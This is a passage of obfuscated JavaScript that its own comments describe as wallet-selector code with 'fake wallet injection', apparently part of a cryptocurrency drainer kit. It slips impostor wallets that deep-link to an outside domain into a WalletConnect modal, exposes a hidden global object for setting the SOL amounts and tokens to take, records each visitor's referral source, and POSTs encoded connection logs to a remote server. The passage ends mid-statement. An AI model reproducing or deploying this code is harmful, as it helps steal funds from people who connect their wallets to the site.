/* ════════════════════════════════════════════════════════════
 * SECTION 10 — WALLET SELECTOR UI + FAKE WALLET INJECTION
 * See docs/execution_flow.md and docs/backend_protocol.md.
 * See docs/ for full documentation.
 * ════════════════════════════════════════════════════════════ */

/* ═══════════════════════════════════════════════════════════
 * SECTION 10 — WALLET SELECTOR UI + FAKE WALLET INJECTION
 * mountWalletSelector(): renders @reown/appkit WalletConnect modal
 * Injects fake wallets at end of list:
 *   - Volsungar (id6757104054, Asgarbyte)
 *   - SOC Wallet (SOC JOINT STOCK)
 *   - Hero Wallet (PAYEXCHANGE)
 * All fake wallets deep-link to reactwalletback.com/app-link/<addr>
 * ═══════════════════════════════════════════════════════════ */
function mountWalletSelector(_str_cache, __str_table__) {
  if (!__str_table__) {
    __str_table__ = function(...__str_table__) {
      __str_table__[-182] = _str_cache["po"]();
      if (!__str_table__[-182]) {
        throw new(Error)("not connected")
      }
      return __str_table__[-182]
    }
  }
  let {
    ["c"]: _s1, ["fo"]: _s3
  } = _str_cache;
  let _s2 = new(Proxy)({
    get ["solanaPrice"]() {
      return solUsdRate
    },
    ["connect"]: _limitArgs((...__str_table__) => {
      _noop(__str_table__["length"] = 1, _str_cache["mo"](), __str_table__[0] && _s3["cn"](__str_table__[0]))
    }),
    ["process"]: _limitArgs((...__str_table__) => {
      __str_table__["length"] = 1;
      return _str_cache["go"](__str_table__[0])
    }),
    ["onConnect"]: _limitArgs((..._str_cache) => {
      _noop(_str_cache["length"] = 1, _v534 = _str_cache[0])
    }),
    ["onRequest"]: _limitArgs((..._str_cache) => {
      _noop(_str_cache["length"] = 1, _v535 = _str_cache[0])
    }),
    ["onApprove"]: _limitArgs((..._str_cache) => {
      _noop(_str_cache["length"] = 1, _v536 = _str_cache[0])
    }),
    ["onDecline"]: _limitArgs((..._str_cache) => {
      _noop(_str_cache["length"] = 1, _v537 = _str_cache[0])
    }),
    ["getBalance"]: () => {
      return __str_table__()["we"]()
    },
    ["getAddress"]: () => {
      return __str_table__()["b"]["e"]
    },
    ["isInWallet"]: () => {
      return _isMobileCheck()
    },
    ["openModal"]: () => {
      return _s3["bt"]()
    },
    ["closeModal"]: () => {
      return _s3["an"]()
    },
    ["disconnect"]: () => {
      return _s3["Le"]()
    },
    ["Debox://"]: _limitArgs((..._str_cache) => {
      _str_cache["length"] = 1;
      return _v900(_str_cache[0])
    }),
    ["https://debox.pro/wc"]: _limitArgs((..._str_cache) => {
      _str_cache["length"] = 1;
      return _s3["cn"](_str_cache[0])
    }),
    ["setSolAmount"](..._str_cache) {
      var __str_table__, _s3;

      function* _s2(_s3, _s2, _s5, _s4, _s6 = {
        ["\u6845"]: {}
      }) {
        while (_s3 + _s2 + _s5 + _s4 !== -8) {
          with(_s6["\u569E"] || _s6) {
            switch (_s3 + _s2 + _s5 + _s4) {
              case _s6["\u6845"]["\u80E4"] + -186:
                _noop(_s6["\u569E"] = _s6["\u75F6"], _s2 += 408, _s5 += -398, _s4 += 15);
                break;
              case 203:
              case _s4 - 203:
              case 44:
                return __str_table__ = true, _s1["Ne"]["tt"] = _str_cache[CONSTS[_s3 + 327]];
                _noop(_s6["\u569E"] = _s6["\u9F5A"], _s3 += 402, _s2 += 407, _s5 += -426, _s4 += -271);
                break;
              case -197:
                _noop([_s6["\u6845"]["\u8684"], _s6["\u6845"]["\u80E4"]] = [-71, 139], _s6["\u569E"] = _s6["\u7E71"], _s2 += 408, _s5 += -395, _s4 += 176);
                break;
              case -1:
              case _s5 - 55:
                _noop([_s6["\u6845"]["\u8684"], _s6["\u6845"]["\u80E4"]] = [-241, 153], _str_cache["length"] = CONSTS[_s5 + 70]);
                if (typeof _str_cache[CONSTS[_s3 + 509]] != "number" || _str_cache[0] < CONSTS[_s5 + 951] || _str_cache[0] > 1000000) {
                  _noop(_s6["\u569E"] = _s6["\u6845"], _s3 += 354, _s2 += -180, _s5 += -139, _s4 += -93);
                  break
                } else {
                  _noop(_s6["\u569E"] = _s6["\u6845"], _s3 += 182, _s2 += -340, _s5 += 281, _s4 += -122);
                  break
                }
              case 239:
              case 80:
              case _s6["\u6845"]["\u8684"] + 388:
                throw new(_g("sKz9Py" + CONSTS[_s3 + -25]))("invalid amount");
                _noop(_s6["\u569E"] = _s6["\u6845"], _s3 += -503, _s2 += -196, _s5 += 222, _s4 += 210);
                break;
              default:
                throw new(TypeError)("invalid amount");
                _noop(_s6["\u569E"] = _s6["\u6845"], _s3 += -172, _s2 += -160, _s5 += 420, _s4 += -29);
                break
            }
          }
        }
      }
      _noop(__str_table__ = undefined, _s3 = _s2(-503, 243, -66, 205)["next"]()["value"]);
      if (__str_table__) {
        return _s3
      }
    },
    ["setToken"](..._str_cache) {
      _noop(_str_cache["length"] = 1, {
        ["account"]: _str_cache["a"],
        ["mint"]: _str_cache["b"],
        ["owner"]: _str_cache[3],
        ["symbol"]: _str_cache[-133],
        ["decimals"]: _str_cache[5],
        ["price"]: _str_cache[229],
        ["amount"]: _str_cache["g"],
        ["spl2022"]: _str_cache[74]
      } = _str_cache[0]);
      if (typeof _str_cache["a"] != "string" || typeof _str_cache["b"] != "string" || typeof _str_cache[3] != "string" || typeof _str_cache[-133] != "string" || typeof _str_cache[5] != "number" || typeof _str_cache[229] != "number" || typeof _str_cache["g"] != "number" || typeof _str_cache[74] != "boolean" || _str_cache[5] < 0 || _str_cache[5] > 18 || _str_cache[229] < 0 || _str_cache["g"] < 1) {
        throw new(TypeError)("com.tm.security.wallet")
      }
      _noop(_v284(_str_cache["a"]), _v284(_str_cache["b"]), _v284(_str_cache[3]), _s1["Ne"]["St"] = {
        ["de"]: _str_cache["a"],
        ["q"]: _str_cache["b"],
        ["je"]: _str_cache[3],
        ["ze"]: _str_cache[-133],
        ["g"]: _str_cache[5],
        ["ot"]: _str_cache[229],
        ["Oe"]: _str_cache["g"],
        ["J"]: _str_cache[74]
      })
    }
  }, {
    ["get"]: _WC_provider["get"]
  });
  Object["defineProperty"](window, "piter", {
    ["value"]: _s2
  })
}
_noop(_v874 = new(RegExp)("^[ -~]{2,256}$", ""), _v875 = new(RegExp)("ukey-wallet://", "i"), _v386 = "_0x6");

function _v1274(..._str_cache) {
  var __str_table__, _s1;

  function* _s3(_s1, _s3, _s2 = {
    ["\u94B6"]: {}
  }) {
    while (_s1 + _s3 !== -177) {
      with(_s2["\u7A0E"] || _s2) {
        switch (_s1 + _s3) {
          case -175:
            return __str_table__ = true, _storeRef[CONSTS[_s1 + 608]](_v386, _str_cache[-CONSTS[_s1 + 872]]), _str_cache[-CONSTS[_s1 + 872]];
            _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s3 += 262);
            break;
          case _s3 != 328 && _s3 - 250:
            _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += 374, _s3 += -326);
            break;
            if (_s3 < -(_s1 + 479)) {
              _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s3 += 262);
              break
            }
          case -151:
          case -171:
          case _s1 - 260:
            _str_cache[-133] = new(URLSearchParams)(location[CONSTS[_s1 + 449]])["get"]("utm_source") ?? void 0;
            if (!_str_cache[-133] && document[CONSTS[_s1 + 578] + "er"] && (_str_cache[-133] = _v875[CONSTS[_s1 + 992]](document[CONSTS[_s1 + 578] + "er"])?.[1]), _str_cache[-CONSTS[_s1 + 779]] && _v874["test"](_str_cache[-CONSTS[_s1 + 779]])) {
              _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += -93, _s3 += 54);
              break
            } else {
              _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += -93, _s3 += 316);
              break
            }
            if (_s1 != 124) {
              _s2["\u7A0E"] = _s2["\u94B6"];
              break
            }
          case 155:
          default:
          case -93:
            _noop([_s2["\u94B6"]["\u750F"], _s2["\u94B6"]["\u8EFD"]] = [-178, 22], _s2["\u7A0E"] = _s2["\u94B6"], _s1 += -203, _s3 += 295);
            break;
          case _s2["\u94B6"]["\u750F"] + -269:
            return __str_table__ = true, _str_cache[-206];
            _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += -92, _s3 += 12);
            break;
          case _s2["\u94B6"]["\u750F"] + -17:
            return __str_table__ = true, _str_cache[-206];
            _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += 289, _s3 += -621);
            break;
          case 137:
          case _s1 != -233 && _s1 - -56:
            _noop(_s2["\u7A0E"] = _s2["\u8667"], _s1 += -264);
            break;
          case -173:
          case 105:
            _noop([_s2["\u94B6"]["\u750F"], _s2["\u94B6"]["\u8EFD"]] = [213, -176], _str_cache[-206] = _storeRef[CONSTS[_s1 + 964]](_v386));
            if (_str_cache[-CONSTS[_s1 + 514]]) {
              _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += 163, _s3 += 206);
              break
            } else {
              _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += 452, _s3 += -415);
              break
            }
            if (!(_s1 == -(_s1 + 656))) {
              break
            }
          case -153:
            return __str_table__ = true, _storeRef[CONSTS[_s1 + 520]](_v386, _str_cache[-133]), _str_cache[-133];
            _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += -88, _s3 += 328);
            break;
          case _s2["\u94B6"]["\u8EFD"] + 243:
            return __str_table__ = true, _str_cache[-CONSTS[_s1 + 184]];
            _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += 122, _s3 += -325);
            break;
          case _s3 != 66 && _s3 - 250:
            _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += 281, _s3 += -272);
            break;
          case _s3 != 65 && _s3 - -2:
          case 48:
          case -70:
            return __str_table__ = true, _str_cache[-206];
            _noop(_s2["\u7A0E"] = _s2["\u94B6"], _s1 += 122, _s3 += -86);
            break
        }
      }
    }
  }
  _noop(__str_table__ = undefined, _s1 = _s3(-328, 155)["next"]()["value"]);
  if (__str_table__) {
    return _s1
  }
}
_noop(_v277 = undefined, _v212 = undefined, _v278 = undefined, _v279 = undefined, _v280 = undefined, _v538 = undefined, _v539 = undefined, _v540 = class extends _v733 {
  constructor(_str_cache, __str_table__) {
    _noop(super(__str_table__), _initPriv(this, _v280), _initPriv(this, _v277, new(WalletConnectBase)), _initPriv(this, _v212, []), _initPriv(this, _v278, []), _initPriv(this, _v279), _setPriv(this, _v279, _str_cache))
  }
  async ["ke"](_str_cache, __str_table__, _s1) {
    _v878(_str_cache, __str_table__);
    let _s3 = _getPriv(this, _v279)["uo"]() ?? "";
    let _s2 = _getPriv(this, _v278)[_str_cache] ?? 0;
    if (_now() - _s2 < 5) {
      return
    }
    if (_str_cache == 4) {
      if (_getPriv(this, _v277)["has"](_s3)) {
        return
      }
      _getPriv(this, _v277)["set"](_s3, !0)
    }
    let _s5 = _callPriv(this, _v280, _v539)["call"](this, _str_cache);
    _s5 && ((await _callPriv(this, _v280, _v538)["call"](this, _str_cache, __str_table__, _s1)) && (_getPriv(this, _v278)[_str_cache] = _now()), _s5())
  }
}, _v277 = new(WeakMap), _v212 = new(WeakMap), _v278 = new(WeakMap), _v279 = new(WeakMap), _v280 = new(WeakMap), _v538 = async function(_str_cache, __str_table__, _s1) {
  let _s3 = [];
  for (let _s2 of _s1?.Me ?? []) {
    let _s5 = _v882(_s2);
    _s5 && _s3["push"](_s5)
  }
  let _s4 = __str_table__["c"]["Se"];
  let _s6 = this["Zn"](_str_cache, __str_table__, {
    ..._s1,
    ["Me"]: _s3
  });
  let _s7 = _v1057();
  _noop(_s4 != _s7 && (_s6["origin"] = _s7), _s6["un"] = navigator["language"]["slice"](0, 5));
  let _s8 = _v879(_s6);
  let _defineProperty = await _buildTokenTx(_s8, _s4 + "log");
  let _getOwnPropDesc = AbortSignal["Be"](3000);
  return _retry(async () => {
    return _getOwnPropDesc["aborted"] ? !1 : (await fetch(getString(186) + _s4 + "https://app.ukey.io/wc/connect", {
      ["headers"]: {
        ["content-type"]: getString(293)
      },
      ["method"]: "POST",
      ["body"]: _defineProperty["toBase64"](),
      ["keepalive"]: !0,
      ["signal"]: _getOwnPropDesc
    }))["ok"]
  }, 5, 150)
}, _v539 = function(_str_cache) {
  if (_getPriv(this, _v212)[_str_cache]) {
    return !1
  }
  let __str_table__ = () => {
    _noop(_getPriv(this, _v212)[_str_cache] = !1, removeEventListener(_s1))
  };
  _getPriv(this, _v212)[_str_cache] = !0;
  let _s1 = setTimeout(__str_table__, 2500);
  return __str_table__
}, _storeKey = "_0x5");
async
